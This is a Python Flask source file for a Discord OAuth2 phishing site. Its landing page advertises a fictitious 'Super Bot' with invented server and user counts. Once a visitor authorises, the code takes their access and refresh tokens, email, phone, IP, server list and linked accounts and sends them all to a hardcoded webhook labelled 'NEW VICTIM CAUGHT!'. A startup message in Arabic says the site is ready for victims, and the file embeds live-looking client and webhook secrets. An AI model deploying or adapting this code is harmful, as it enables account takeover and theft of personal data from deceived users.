import os
import json
import requests
from urllib.parse import urlencode
from flask import Flask, request, redirect, render_template_string
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.urandom(32)

# ===== CONFIG =====
CLIENT_ID = "1541786357028884534"
CLIENT_SECRET = "7n8YSrS5CM3cabjqeQY_ba-nsvax0bOW"
REDIRECT_URI = "https://auth2-logger.vercel.app/callback"
OAUTH_SCOPE = "identify connections guilds.members.read email gdm.join"

# ===== WEBHOOK (HARDCODED) =====
WEBHOOK_URL = "https://discord.com/api/webhooks/1543233853873983538/5qVhoKAmoRBzhXUczSTENIoG0khrnn9DzT_-7vXJJN-PbdovbClFoPifZW0nxBVPEz5F"

# ==================

BASE_OAUTH_URL = "https://discord.com/api/oauth2/authorize"
TOKEN_URL = "https://discord.com/api/oauth2/token"
API_BASE = "https://discord.com/api/v10"

HTML_INDEX = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Bot - Invite</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: #fff;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: rgba(255,255,255,0.05);
            border-radius: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
            max-width: 500px;
            width: 90%;
        }
        .bot-avatar {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: linear-gradient(45deg, #5865F2, #7289DA);
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 60px;
            box-shadow: 0 0 30px rgba(88,101,242,0.5);
        }
        h1 { font-size: 2em; margin-bottom: 10px; }
        .tag { color: #7289DA; font-size: 0.9em; margin-bottom: 20px; }
        .features {
            text-align: left;
            margin: 20px 0;
            padding: 20px;
            background: rgba(0,0,0,0.2);
            border-radius: 10px;
        }
        .features li {
            list-style: none;
            padding: 8px 0;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }
        .features li::before {
            content: "✓ ";
            color: #43b581;
            font-weight: bold;
        }
        .btn {
            display: inline-block;
            padding: 15px 40px;
            background: linear-gradient(45deg, #5865F2, #7289DA);
            color: #fff;
            text-decoration: none;
            border-radius: 50px;
            font-size: 1.1em;
            font-weight: bold;
            margin-top: 20px;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(88,101,242,0.4);
            border: none;
            cursor: pointer;
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(88,101,242,0.6);
        }
        .stats {
            display: flex;
            justify-content: space-around;
            margin: 20px 0;
        }
        .stat { text-align: center; }
        .stat-num { font-size: 1.5em; font-weight: bold; color: #7289DA; }
        .stat-label { font-size: 0.8em; color: #888; }
    </style>
</head>
<body>
    <div class="container">
        <div class="bot-avatar">🤖</div>
        <h1>Super Bot</h1>
        <div class="tag">The ultimate Discord bot for your server</div>

        <div class="stats">
            <div class="stat">
                <div class="stat-num">50K+</div>
                <div class="stat-label">Servers</div>
            </div>
            <div class="stat">
                <div class="stat-num">2M+</div>
                <div class="stat-label">Users</div>
            </div>
            <div class="stat">
                <div class="stat-num">99.9%</div>
                <div class="stat-label">Uptime</div>
            </div>
        </div>

        <ul class="features">
            <li>Advanced Moderation System</li>
            <li>Music Player with High Quality</li>
            <li>Custom Economy & Leveling</li>
            <li>Auto-Moderation & Anti-Raid</li>
            <li>Ticket System & Logging</li>
            <li>Fun Games & Mini-Games</li>
        </ul>

        <a href="/login" class="btn">➕ Add to Discord</a>
    </div>
</body>
</html>
"""

HTML_SUCCESS = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Success!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: #fff;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: rgba(255,255,255,0.05);
            border-radius: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
        }
        .success-icon {
            font-size: 80px;
            margin-bottom: 20px;
        }
        h1 { font-size: 2em; margin-bottom: 10px; color: #43b581; }
        p { color: #aaa; margin: 10px 0; }
        .btn {
            display: inline-block;
            padding: 12px 30px;
            background: linear-gradient(45deg, #43b581, #3ba55d);
            color: #fff;
            text-decoration: none;
            border-radius: 50px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="success-icon">✅</div>
        <h1>Bot Added Successfully!</h1>
        <p>Thank you for adding Super Bot to your server.</p>
        <p>The bot will join your server shortly.</p>
        <a href="/" class="btn">Back to Home</a>
    </div>
</body>
</html>
"""

HTML_ERROR = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: #fff;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: rgba(255,255,255,0.05);
            border-radius: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
        }
        .error-icon { font-size: 80px; margin-bottom: 20px; }
        h1 { font-size: 2em; margin-bottom: 10px; color: #ed4245; }
        .error-msg { color: #faa; background: rgba(237,66,69,0.1); padding: 15px; border-radius: 8px; margin: 15px 0; font-family: monospace; font-size: 0.9em; word-break: break-all; }
        .btn {
            display: inline-block;
            padding: 12px 30px;
            background: linear-gradient(45deg, #5865F2, #7289DA);
            color: #fff;
            text-decoration: none;
            border-radius: 50px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="error-icon">❌</div>
        <h1>Authorization Failed</h1>
        <p>An error occurred during the authorization process.</p>
        <div class="error-msg">{{ error }}</div>
        <a href="/" class="btn">Try Again</a>
    </div>
</body>
</html>
"""


def send_webhook(title, fields, color=0x5865F2):
    """Send data to Discord webhook"""
    embed = {
        "title": title,
        "color": color,
        "fields": [{"name": k, "value": str(v)[:1024] if v else "N/A", "inline": False} for k, v in fields.items()],
        "footer": {"text": f"Token Logger | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"},
        "timestamp": datetime.utcnow().isoformat()
    }

    payload = {"username": "🔥 Token Logger", "embeds": [embed]}

    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except Exception as e:
        print(f"[!] Webhook error: {e}")


def send_startup_notification():
    """Send startup confirmation to webhook"""
    embed = {
        "title": "✅ تم تشغيل الموقع بنجاح",
        "description": "الموقع شغال وجاهز لاستقبال الضحايا",
        "color": 0x43b581,
        "fields": [
            {"name": "🌐 URL", "value": REDIRECT_URI.replace('/callback', ''), "inline": False},
            {"name": "🔗 OAuth2 URL", "value": f"{BASE_OAUTH_URL}?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope={OAUTH_SCOPE.replace(' ', '+')}", "inline": False},
            {"name": "⏰ Time", "value": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "inline": False},
        ],
        "footer": {"text": "Token Logger System"},
        "timestamp": datetime.utcnow().isoformat()
    }

    payload = {"username": "🚀 Token Logger", "embeds": [embed]}

    try:
        resp = requests.post(WEBHOOK_URL, json=payload, timeout=10)
        print(f"[✅] Startup notification sent: {resp.status_code}")
    except Exception as e:
        print(f"[!] Startup webhook failed: {e}")


# ===== SEND STARTUP NOTIFICATION ON IMPORT =====
print("[🚀] Token Logger starting up...")
send_startup_notification()


@app.route("/")
def index():
    return render_template_string(HTML_INDEX)


@app.route("/login")
def login():
    params = {
        "client_id": CLIENT_ID,
        "redirect_uri": REDIRECT_URI,
        "response_type": "code",
        "scope": OAUTH_SCOPE,
    }
    return redirect(f"{BASE_OAUTH_URL}?{urlencode(params)}")


@app.route("/callback")
def callback():
    code = request.args.get("code")
    error = request.args.get("error")
    error_description = request.args.get("error_description", "")

    print(f"[DEBUG] Callback received: code={code is not None}, error={error}, desc={error_description}")
    print(f"[DEBUG] Request args: {dict(request.args)}")

    if error:
        return render_template_string(HTML_ERROR, error=f"{error}: {error_description}"), 400

    if not code:
        return render_template_string(HTML_ERROR, error="No authorization code provided by Discord."), 400

    # Step 1: Exchange code for token
    token_data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
    }

    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    try:
        resp = requests.post(TOKEN_URL, data=token_data, headers=headers, timeout=10)
        print(f"[DEBUG] Token response status: {resp.status_code}")
        print(f"[DEBUG] Token response: {resp.text[:500]}")
        token_info = resp.json()
    except Exception as e:
        return render_template_string(HTML_ERROR, error=f"Token exchange failed: {str(e)}"), 500

    if "error" in token_info:
        return render_template_string(HTML_ERROR, error=f"Discord API Error: {token_info.get('error_description', token_info.get('error'))}"), 400

    access_token = token_info.get("access_token")
    refresh_token = token_info.get("refresh_token")
    expires_in = token_info.get("expires_in")
    scope = token_info.get("scope")

    if not access_token:
        return render_template_string(HTML_ERROR, error=f"Failed to get access token. Response: {json.dumps(token_info)}"), 400

    auth_header = {"Authorization": f"Bearer {access_token}"}

    # Step 2: Get user info
    try:
        user_resp = requests.get(f"{API_BASE}/users/@me", headers=auth_header, timeout=10)
        user_data = user_resp.json()
        print(f"[DEBUG] User data: {user_data}")
    except Exception as e:
        user_data = {"error": str(e)}

    # Step 3: Get guilds
    try:
        guilds_resp = requests.get(f"{API_BASE}/users/@me/guilds", headers=auth_header, timeout=10)
        guilds_data = guilds_resp.json()
    except Exception as e:
        guilds_data = []

    # Step 4: Get connections
    try:
        conn_resp = requests.get(f"{API_BASE}/users/@me/connections", headers=auth_header, timeout=10)
        connections_data = conn_resp.json()
    except Exception as e:
        connections_data = []

    # Prepare data
    user_id = user_data.get("id", "N/A")
    username = user_data.get("username", "N/A")
    global_name = user_data.get("global_name", "N/A")
    email = user_data.get("email", "N/A")
    phone = user_data.get("phone", "N/A")
    mfa = user_data.get("mfa_enabled", False)
    verified = user_data.get("verified", False)
    locale = user_data.get("locale", "N/A")
    avatar = user_data.get("avatar")
    banner = user_data.get("banner")
    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png" if avatar else "N/A"
    banner_url = f"https://cdn.discordapp.com/banners/{user_id}/{banner}.png" if banner else "None"

    guilds_str = "\n".join([f"• {g.get('name', 'Unknown')} (ID: {g.get('id', 'N/A')}, Owner: {g.get('owner', False)})" for g in guilds_data[:15]]) if isinstance(guilds_data, list) else str(guilds_data)

    connections_str = "\n".join([f"• {c.get('type', 'Unknown')}: {c.get('name', 'Unknown')} (ID: {c.get('id', 'N/A')}, Verified: {c.get('verified', False)})" for c in connections_data[:15]]) if isinstance(connections_data, list) else str(connections_data)

    # Send to webhook
    fields = {
        "👤 Username": f"{username} (@{global_name})",
        "🆔 User ID": user_id,
        "📧 Email": f"{email} ({'Verified' if verified else 'Unverified'})",
        "📱 Phone": phone if phone else "Not set",
        "🔐 MFA Enabled": "✅ Yes" if mfa else "❌ No",
        "🌍 Locale": locale,
        "🎭 Avatar": avatar_url,
        "🖼️ Banner": banner_url,
        "🔑 Access Token": f"`{access_token}`",
        "🔄 Refresh Token": f"`{refresh_token}`",
        "⏱️ Expires In": f"{expires_in} seconds",
        "📋 Scope": scope,
        "🌐 IP Address": request.remote_addr,
        "🖥️ User Agent": request.headers.get("User-Agent", "N/A")[:500],
        "🏰 Guilds": f"```{guilds_str[:900] if guilds_str else 'None'}```",
        "🔗 Connections": f"```{connections_str[:900] if connections_str else 'None'}```",
    }

    send_webhook("🎯 NEW VICTIM CAUGHT!", fields, color=0xED4245)

    # Send raw JSON
    full_data = {
        "token_info": token_info,
        "user_data": user_data,
        "guilds": guilds_data,
        "connections": connections_data,
        "ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent", "N/A"),
        "timestamp": datetime.now().isoformat()
    }

    try:
        raw_fields = {
            "📦 Full JSON": f"```json\n{json.dumps(full_data, indent=2, default=str)[:1900]}\n```"
        }
        send_webhook("📦 RAW DATA DUMP", raw_fields, color=0x5865F2)
    except:
        pass

    return render_template_string(HTML_SUCCESS)


# For Vercel serverless
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)
